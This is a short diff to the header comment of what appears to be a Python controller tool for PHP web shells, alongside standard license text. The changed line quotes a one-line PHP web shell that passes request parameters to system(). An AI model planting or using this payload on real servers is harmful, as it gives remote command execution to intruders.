@@ -4,7 +4,7 @@
 -*- coding: utf-8 -*-
 Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>
 
-Command controller for <?php system($_GET[parameter]); ?>
+Command controller for <?php system($_REQUEST[parameter]); ?>
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
